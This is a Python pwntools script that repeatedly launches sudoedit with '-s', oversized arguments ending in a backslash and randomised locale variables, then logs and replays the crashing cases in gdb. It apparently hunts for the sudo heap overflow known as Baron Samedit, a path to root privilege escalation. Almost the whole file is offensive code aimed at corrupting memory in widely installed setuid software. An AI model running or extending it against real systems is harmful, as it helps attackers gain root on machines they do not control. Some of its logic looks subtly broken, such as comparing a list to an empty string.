from pwn import *
import random
import string
from time import sleep
modifiers = ['euro','cjknarrow','cyrillic','saaho','latin','valencia','abegede']


#generate random string

def randstr(n):
    return ''.join([random.choice(string.ascii_letters + string.digits) for i in range(n)])


ENV = {'LC_ALL':'C.UTF-8', 'LC_CTYPE' :'en_US.UTF-8', 'LC_MONETARY' :'en_US.UTF-8','LC_IDENTIFICATION' :'en_US.UTF-8','LC_MEASUREMENT' :'en_US.UTF-8','LC_TELEPHONE' :'en_US.UTF-8','LC_ADDRESS' :'en_US.UTF-8', 'LC_NAME' :'en_US.UTF-8','LC_PAPER' :'en_US.UTF-8','LC_MESSAGES' :'en_US.UTF-8','LC_MONETARY' :'en_US.UTF-8','LC_COLLATE' :'en_US.UTF-8', 'LC_TIME': 'en_US.UTF-8', 'LC_NUMERIC':'en_US.UTF-8','LANGUAGE':'en_US','LANG': 'en_US.UTF-8'  }

user_args_size = 10
sudo_args = [["-A"], ["-n"], ["-u", "hacker"],[""],[""],[""],[""],[""],[""]]

for __ in range(1,400,1):
    print(__)
    modifier_ = random.choice(modifiers)
    A = random.randint(1,500)
    B = random.randint(1,500)
    C = random.randint(1,500)
    D = random.randint(1,500)

    #random modifier
    env_var = random.sample(list(ENV.keys()),random.randint(1,len(ENV.keys())))
    env = {}
    for i in env_var:
        if random.random()<0.2:
            env[i] = 'en_US.UTF-8@'+randstr(random.randint(0,100)) + '\\'
        else:
            env[i] = 'en_US.UTF-8@'+randstr(random.randint(0,100))

    #sudo_args
    sudo_arg = random.choice(sudo_args)

    #user_arg size
    user_arg_size = random.randint(0,0x1000)

    #random args
    args = random.sample(["B"*A,"C"*B,"D"*C,"E"*D],random.randint(1,1))
    if(sudo_arg == ""):
        p  = process([ "/usr/local/bin/sudoedit", "-s"]+["A"*user_arg_size+"\\"] + args, env=env)
    else:
        p  = process([ "/usr/local/bin/sudoedit"]+ sudo_arg + [ "-s"] +["A"*user_arg_size+"\\"] + args,env=env)
    if (p.poll() == -signal.SIGSEGV):
        print("\033[93m [*] SEGV");
        try:

            env_arg_gdb = []
            for k,v in env.items():
                env_arg_gdb.append(k+"="+v)
            s = "r -s %s '%s\\' %s"%(sudo_arg, "A"*user_arg_size,args[0])

            gdb_p_args = ['env','-i']  + env_arg_gdb + ['gdb','/usr/local/bin/sudoedit']

            filename = "%d.log"%(__)
            open(filename,"w").write(str(['env','-i'] + sudo_arg + env_arg_gdb + ['gdb','/usr/local/bin/sudoedit'])+"\n"+s)
        #opening gdb and checking sigsegv
            gdb = process(gdb_p_args)
            gdb.recv()
            gdb.sendline(s)
            gdb.recvuntil("gdb")
            out =  gdb.recvuntil("gdb")

            a = '\n'.join(out.split("\n")[-4:-1])
            print(a)
            gdb.close()
        except Exception as e:
            print(e)

    p.close()
